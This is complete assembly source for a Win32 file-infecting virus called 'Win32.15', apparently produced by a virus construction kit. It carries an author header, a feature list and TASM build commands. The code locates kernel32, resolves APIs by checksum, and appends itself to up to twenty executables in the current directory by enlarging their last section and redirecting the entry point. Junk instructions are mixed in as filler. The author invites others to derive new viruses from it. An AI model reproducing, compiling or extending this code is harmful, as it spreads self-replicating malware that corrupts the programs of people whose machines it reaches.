              
;
;
; Win32.15 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.15
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 3/14/2016
;  Infection Mark         : 15
;  Infection Type         : increasing last section
;  API Search             : Simple CRC I
;  Entry Point Obscurity  : No
;  Locate Kernel by       : using address from stack
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 30
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m2 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 10d

VirusCode:
Virus:
 call Delta                             ; Get Delta Offset

Delta:
                                        ; add esp, 4
 add esp, 4d
 mov ebx, dword ptr [esp-4]
                                        ; mov ebp, ebx
 mov ebp, ebx
 sub ebp, offset Delta
 jmp KernelSearchStart


;        [ ///// * Retrieve non Kernel API's * \\\\\ ]

GetOtherApis:
 push ecx 
 push edx 
 push ecx
 call dword ptr [ebp+XLoadLibraryA]
 pop edx 
 pop ecx 
                                        ; mov ecx, eax
                                        ; clear ecx
 and ecx, 0
 add ecx, eax
GetOtherApiLoop:
 push ecx 
 push edx 
 push ebx
 push ecx
 call dword ptr [ebp+XGetProcAddress]
 pop edx 
 pop ecx 
 mov dword ptr [edi], eax
                                        ; add edi, 4
 inc edi
 add edi, 3d
 sub edx, 1
 dec edx
 add edx, 1
 jz GetOtherApiEnd
GetOtherApiLoop2:
                                        ; add ebx, 1
 sub ebx, -1d
 cmp byte ptr [ebx], 0
 jne GetOtherApiLoop2
                                        ; add ebx, 1
 add ebx, 1d
 jmp GetOtherApiLoop
GetOtherApiEnd:
ret



;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
                                        ; clear eax
 push 0
 pop eax

 push eax
 push eax
 push 3h
 push eax
                                        ; add eax, 1
 sub eax, -1d
 push eax
 mov ebx, 80000000h or 40000000h
 push ebx
 mov eax, offset WFD_szFileName
 add eax, ebp
 sar ecx, 29d                           ; Trash

 push eax
 call dword ptr [ebp+XCreateFileA]
 dec dword ptr [ebp+Trash1]             ; Trash

 add eax, 1
 jz Closed
 dec eax

 mov dword ptr [ebp+FileHandle], -1
 and dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
 mov edx, dword ptr [ebp+WFD_nFileSizeLow]
 push edx
 push 0
 push edx
 push 0
 push 00000004h
 push 0
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], eax
 pop edx
 test eax, eax
 jz CloseFile
 push edx
 push 0
 push 0
 push 2h
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
                                        ; add eax, 1
 add eax, 1d
 dec eax
 jz UnMapFile
 mov dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
                                        ; clear edi
 mov edi, 0
 xor edi, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], edi

                                        ; clear eax
 mov eax, 40777d
 sub eax, 40777d
 xor eax, dword ptr [ebp+OldEIP]

 push eax
 pop dword ptr [ebp+retEIP]



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
 add ebp, -1
 add ebp, 1
 jz FirstGenHost
 mov edx,12345678h
 org $-4
 retEIP dd 0h
 add edx,12345678h
 org $-4
 retBase dd 0h
 jmp edx



;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
                                        ; clear ebx
 mov ebx, 6889d
 sub ebx, 6889d
 add ebx, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header
 mov eax, ebx
 add eax, [ebx+3Ch]
                                        ; get File Alignment
                                        ; add eax, 60
 add eax, 60d
 mov edx, [eax]
 inc eax
 sub eax, 61d
                                        ; clear eax
 mov eax, -37663d
 add eax, 37663d
 add eax, dword ptr [ebp+WFD_nFileSizeLow]
                                        ; calculate new size
 add eax, VirusSize
 mov dword ptr [ebp+AlignReg1], 0
 xor dword ptr [ebp+AlignReg1], eax
 shl ecx, 23d                           ; Trash
 mov dword ptr [ebp+AlignReg2], edx
 call Align
                                        ; clear eax
 sub eax, eax
 add eax, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], -1
 and dword ptr [ebp+NewSize], eax
 pushad
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], eax
 call CreateMap
 jc NoEXE
 mov esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov ebx, dword ptr [esi+3Ch]
 add ebx, esi
                                        ; infect by increasing the last section
                                        ; clear esi
 and esi, 0
 add esi, ebx
                                        ; get last section
 movzx edx, word ptr [esi+06h]
 sub edx, 1
 imul edx, edx, 28h
 add ebx, edx
                                        ; add ebx, 120
 inc ebx
 add ebx, 119d
                                        ; clear eax
 sub eax, eax
 add eax, dword ptr [esi+74h]
 sal eax, 3
 add ebx, eax
                                        ; get old Entrypoint
 mov eax, dword ptr [esi+28h]
 mov dword ptr [ebp+OldEIP], eax
 mov edx, dword ptr [esi+34h]
 mov dword ptr [ebp+OldBase], edx
                                        ; clear ecx
 xor ecx, ecx

 add ecx, [ebx+10h]
                                        ; mov eax, ecx
 mov eax, ecx
 add ebx, 14h
 add ecx, [ebx]
 sub ebx, 14h
 push ecx
 push eax
 pop edx
 add ebx, 0Ch
 add edx, [ebx]
 sub ebx, 0Ch
 add dword ptr [ebp+Trash1], eax        ; Trash
 mov dword ptr [ebp+NewEIP], -1
 and dword ptr [ebp+NewEIP], edx
                                        ; save new enty point in file
 mov dword ptr [esi+28h], edx
 mov edx, [ebx+10h]
 push edx
                                        ; calculate new section size
 add edx, VirusSize
 mov dword ptr [ebp+AlignReg1], 0
 add dword ptr [ebp+AlignReg1], edx
 push dword ptr [esi+3Ch]
 pop dword ptr [ebp+AlignReg2]
 xor dword ptr [ebp+Trash1], 1388677    ; Trash
 call Align
 mov edx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebx+10h], 0h
 add dword ptr [ebx+10h], edx
 pop edx
 add edx,  (VirusSize-511d)
 add edx, 511d
 mov dword ptr [ebx+08h], edx
 mov edx, dword ptr [ebx+10h]
 add edx, dword ptr [ebx+0Ch]
 mov dword ptr [esi+50h], edx
 sub dword ptr [ebp+Trash1], 1653653    ; Trash
                                        ; set write, read and code flag
 or dword ptr [ebx+24h], 0A0000020h
                                        ; set infection mark
 mov dword ptr [esi+4Ch], 0h
 add dword ptr [esi+4Ch], '15'
                                        ; Append Virus
 pop edi
 add edi, dword ptr [ebp+MapAddress]
 mov ebx, VirusSize
 mov esi, ebp
 add esi, offset Virus


AppendLoop:
 movsb
 dec ebx
 jnz AppendLoop
 cmp dword ptr [ebp+XCheckSumMappedFile], -1d
 je NoCheckSum
 lea edx, [ebp+CheckSum]
 xchg edx, ecx

 push ecx
 lea edx, [ebp+HeaderSum]

 push edx
 mov edx, dword ptr [ebp+NewSize]
 push edx
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XCheckSumMappedFile]
 mov edx, dword ptr [ebp+MapAddress]
 mov edx, [edx+3Ch]
 add edx, dword ptr [ebp+MapAddress]
 mov eax, dword ptr [ebp+CheckSum]
 mov dword ptr [edx+58h], eax
NoCheckSum:
                                        ; decrease Infection Counter
                                        ; clear edx
 sub edx, edx
 xor edx, dword ptr [ebp+InfCounter]
 add edx, -1
 mov dword ptr [ebp+InfCounter], edx
 clc
ret

NoEXE:
 stc
ret



;                  [ ///// * Data * \\\\\ ]

Data:
 NewEIP      dd 0h
 NTableVA    dd 0h
 Imagehlp    db 'imagehlp.dll',0
 MapAddress  dd 0h
 OTableVA    dd 0h
 KernelMZ    dd 0h
 AlignReg1   dd 0h
 HeaderSum dd 0h
 OldEIP      dd 0h
 FindHandle  dd 0h
 CheckSumMFA db 'CheckSumMappedFile',0
 InfCounter  dd 0h

 APIOffsets:
 XMapViewOfFile         dd 0h
 XFindFirstFileA        dd 0h
 XCloseHandle           dd 0h
 XCreateFileA           dd 0h
 XFindClose             dd 0h
 XLoadLibraryA          dd 0h
 XUnmapViewOfFile       dd 0h
 XFindNextFileA         dd 0h
 XCreateFileMappingA    dd 0h
 XGetProcAddress        dd 0h

 AlignReg2   dd 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 NewSize     dd 0h
 K32Trys     dd 0h
 ATableVA    dd 0h
 MapHandle   dd 0h
 OldBase     dd 400000h
 XCheckSumMappedFile    dd 0h
 CheckSum dd 0h
 TempApisearch2 dd 0h
 counter     dw 0h
 KernelPE    dd 0h
 db 'Win32.15 - SnakeByte',0
 FileHandle  dd 0h

 APINames:
 dd 'Ma'+'pV'+'ie'+'wO'+'fF'+'il'+'e'*100h
 dd 'Fi'+'nd'+'Fi'+'rs'+'tF'+'il'+'eA'
 dd 'Cl'+'os'+'eH'+'an'+'dl'+'e'*100h
 dd 'Cr'+'ea'+'te'+'Fi'+'le'+'A'*100h
 dd 'Fi'+'nd'+'Cl'+'os'+'e'*100h
 dd 'Lo'+'ad'+'Li'+'br'+'ar'+'yA'
 dd 'Un'+'ma'+'pV'+'ie'+'wO'+'fF'+'il'+'e'*100h
 dd 'Fi'+'nd'+'Ne'+'xt'+'Fi'+'le'+'A'*100h
 dd 'Cr'+'ea'+'te'+'Fi'+'le'+'Ma'+'pp'+'in'+'gA'
 dd 'Ge'+'tP'+'ro'+'cA'+'dd'+'re'+'ss'

 Trash1      dd 0h
 TempAPI     dd 0h
 filemask    db '*.ExE',0




;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
                                        ; clear edx
 and edx, 0
 mov eax, dword ptr [ebp+AlignReg1]
 mov ebx, dword ptr [ebp+AlignReg2]
 div ebx
                                        ; add eax, 1
 add eax, 1d
 mul ebx
 mov dword ptr [ebp+AlignReg1], 0h
 add dword ptr [ebp+AlignReg1], eax
 popad
ret



;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need


                                        ; number of API's we're looking for
 mov eax, NumberOfApis
 mov esi, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
                                        ; clear ecx
 mov ecx, -50188d
 add ecx, 50188d
 add ecx, [esi+78h]
 add ecx, [ebp+KernelMZ]
                                        ; add ecx, 28
 add ecx, 28d
                                        ; get ATableVA
 mov esi, dword ptr [ecx]
 add esi, [ebp+KernelMZ]
                                        ; add ecx, 4
 add ecx, 4d
 mov dword ptr [ebp+ATableVA], esi
 xor dword ptr [ebp+Trash1], ebx        ; Trash
                                        ; get NTableVA
 mov esi, dword ptr [ecx]
 add esi, [ebp+KernelMZ]
 mov dword ptr [ebp+NTableVA], esi
                                        ; add ecx, 4
 add ecx, 4d
                                        ; get OTableVA
 mov esi, dword ptr [ecx]
 add esi, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], esi
                                        ; load API Names and Offsets
 mov ebx, ebp
 add ebx, offset APIOffsets

 lea esi, [ebp+APINames]


GetApisLoop: 

                                        ; search 'em
                                        ; esi points to the CRC
                                        ; ebx points to the offset

 call SearchAPI1
                                        ; add esi, 4
 add esi, 4d
                                        ; mov edx, -1
 mov edx, 0
 add edx, -1d
 and edx, dword ptr [ebp+TempAPI]
 mov dword ptr [ebx], 0
 add dword ptr [ebx], edx
                                        ; add ebx, 4
 add ebx, 4d
 sub eax, 1
 jnz GetApisLoop
 xor dword ptr [ebp+Trash1], eax        ; Trash
                                        ; mov edx, 1
 mov edx, ( 1d - 37d )
 add edx, 37d
 lea eax, [ebp+CheckSumMFA]
 xchg eax, ebx

 lea eax, [ebp+XCheckSumMappedFile]
 xchg eax, edi

 lea eax, [ebp+Imagehlp]
 xchg ecx, eax

 call GetOtherApis
 sub eax, 69012329d                     ; Trash
 jmp Outbreak



;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...
                                        ; store old EIP and ImageBase
 mov edi, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], edi

 mov edx, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], edx




;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 lea ebx, [ebp+filemask]
 xchg edx, ebx

                                        ; Find File to infect
 call FindFirstFileProc
 inc eax
 jz EndInfectCurDir
                                        ; Set Infection Counter
                                        ; mov edi, 20
 mov edi, 0
 add edi, 20d
 mov dword ptr [ebp+InfCounter], 0
 xor dword ptr [ebp+InfCounter], edi

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
 cmp [ebp+InfCounter], 0h
 je EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 or eax, eax
 jnz InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
 mov ecx, dword ptr [ebp+FindHandle]
 push ecx
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; esi Points to API-CRC ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad




 mov eax, dword ptr [ebp+NTableVA]
                                        ; clear the counter
 mov word ptr [ebp+counter], 0h


SearchNextApi1:                         ; search for the API's
 push eax
 mov ebx, dword ptr [eax]
 inc ecx                                ; Trash
 add ebx, [ebp+KernelMZ]
                                        ; mov eax, ebx
                                        ; clear eax
 mov eax, 0
 add eax, ebx
                                        ; mov edi, eax
 mov edi, eax
 mov dword ptr [ebp+TempApisearch2], edi
 push esi
 cld

                                        ; edi Points to API-Name ( Kernel )
                                        ; esi Points to API-Name CRC ( Virus )
                                        ; compare Names
                                        ; simple CRC Api Search by Lethalmind
                                        ; clear ecx
 mov ecx, 12508d
 sub ecx, 12508d
 add ecx, dword ptr [esi]
 LoopChsksm:
                                        ; clear ebx
 mov ebx, -8393d
 add ebx, 8393d
 mov bl, byte ptr [edi]
                                        ; add edi, 1
 sub edi, -1d
 shl bx,8d
 sub ecx, ebx
 cmp bx, 0
 je LoopConti
                                        ; clear ebx
 mov ebx, 15263d
 sub ebx, 15263d
 mov bl, byte ptr [edi]
 sub ecx, ebx
                                        ; add edi, 1
 sub edi, -1d
 test bx, bx
 jnz LoopChsksm
LoopConti:
                                        ; add ecx, 1
 inc ecx
 sub ecx, 1
 jz FoundApi1

ApiNotFound:                            ; we did not find it :(
 pop esi
 pop eax
 mov ecx, ebx                           ; Trash
                                        ; clear edi
 mov edi, -48287d
 add edi, 48287d
 xor edi, dword ptr [ebp+TempApisearch2]
                                        ; add eax, 4
 inc eax
 add eax, 3d
 inc word ptr [ebp+counter]
 cmp word ptr [ebp+counter], 2001h
 jne SearchNextApi1
 jmp NotFoundApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 pop esi
 add esp, 4h
                                        ; retrieve the offset
 movzx ebx, word ptr [ebp+counter]
                                        ; point to ordinal Table
 sal ebx, 1                             ; multiply with 2
 add ebx, dword ptr [ebp+OTableVA]
 push ebx
 pop ecx
 movzx ebx, word ptr [ecx]
 shl ebx, 2h
 add ebx, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 mov ecx, dword ptr [ebx]
 add ecx, dword ptr [ebp+KernelMZ]
 mov dword ptr [ebp+TempAPI], ecx
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop ebx
 popad
 jmp ExecuteHost



;          [ ///// * FindFiles Procedure * \\\\\ ]


ClearOldData:                           ; we don't want waste in the fields
 pushad
                                        ; mov eax, 276
 mov eax, 276d
 lea ebx, [ebp+WFD_szFileName]
 xchg edx, ebx


ClearOldData2:
 mov byte ptr [edx], 0h
                                        ; add edx, 1
 inc edx
 dec eax
 jnz ClearOldData2
 popad
ret


FindNextFileProc:                       ; find another file
 call ClearOldData
 lea ecx, [ebp+WIN32_FIND_DATA]
 xchg ecx, ebx

 push ebx
                                        ; mov ecx, -1
 mov ecx, ( -1d + 12d )
 sub ecx, 12d
 and ecx, dword ptr [ebp+FindHandle]
 push ecx
 call dword ptr [ebp+XFindNextFileA]
ret

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 lea eax, [ebp+WIN32_FIND_DATA]

 push eax
 push edx
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], eax
ret





;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 pop ecx
 add esp, -4d
 or eax, ecx                            ; Trash
                                        ; round to pages
 shr ecx, 16d
 ror ecx, 16d
                                        ; set maximum search count
 mov dword ptr [ebp+K32Trys], 0
 add dword ptr [ebp+K32Trys], 5h

GK1:                                    ; check for DOS-EXE Stub
 cmp dword ptr [ebp+K32Trys], 0h
 jnz GotKernelXX
 mov ebx, eax                           ; Trash
 jmp NoKernel
GotKernelXX:
 adc dword ptr [ebp+Trash1], 959126     ; Trash
                                        ; check for ZM
 cmp word ptr [ecx], 'ZM'
 je CheckPE

GK2:
 inc ecx
 sub ecx, 65537d
 mov edx, dword ptr [ebp+K32Trys]
 dec edx
 mov dword ptr [ebp+K32Trys], edx
 jmp GK1

CheckPE:                                ; Check if found file is a win32 exe
 mov ebx, [ecx+3Ch]
 neg ecx
 sub ebx, ecx
 neg ecx
                                        ; check for EP
 cmp word ptr [ebx], 'EP'
 je CheckDLL
 jmp GK2

CheckDLL:
                                        ; check if the file is a DLL
                                        ; add ebx, 22
 add ebx, 22d
                                        ; clear eax
 mov eax, -46851d
 add eax, 46851d
 movzx eax, word ptr [ebx]
 and ax, 0F000h
 cmp ax, 02000h
 je GotDLL
 jmp GK2
GotDLL:                                 ; we found a DLL file
 sub ebx, 22d
 mov edx, 7758664d                      ; Trash


KernelFound:
 mov dword ptr [ebp+KernelPE], ebx
 mov dword ptr [ebp+KernelMZ], ecx

 mov ecx, offset GetApis
 add ecx, ebp

 push ecx
ret

;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; check for minimum filesize
                                        ; clear ebx
 and ebx, 0
 xor ebx, dword ptr [ebp+WFD_nFileSizeLow]
 cmp ebx, 20000d
 jbe NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
 push dword ptr [ebp+MapAddress]
 pop ecx
                                        ; check for ZM
 cmp word ptr [ecx], 'ZM'
 je Goodfile
 jmp Notagoodfile

Goodfile:
                                        ; clear edx
 and edx, 0
 mov dx, word ptr [ecx+3Ch]
 add edx, -1
 add edx, 1
 jz Notagoodfile
                                        ; clear ebx
 xor ebx, ebx
 add ebx, dword ptr [ecx+3Ch]
                                        ; check if header lies inside the file
 cmp ebx, dword ptr [ebp+WFD_nFileSizeLow]
 ja Notagoodfile
 add ebx, ecx
                                        ; check for PE Header
                                        ; check for EP
 cmp word ptr [ebx], 'EP'
 je Goodfile2
                                        ; clear edx
 mov edx, -21899d
 add edx, 21899d
 cmp edx, 0
 je Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [ebx+4Ch], '15'
 jz Notagoodfile
 call InfectEXE                         ; Infect the file
 jnc Notagoodfile
 jmp NoInfection

Notagoodfile:
 call UnMapFile
 shl edx, 19d                           ; Trash

NoInfection:
ret




CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
 push 0h
 call ExitProcess



end FakeCode

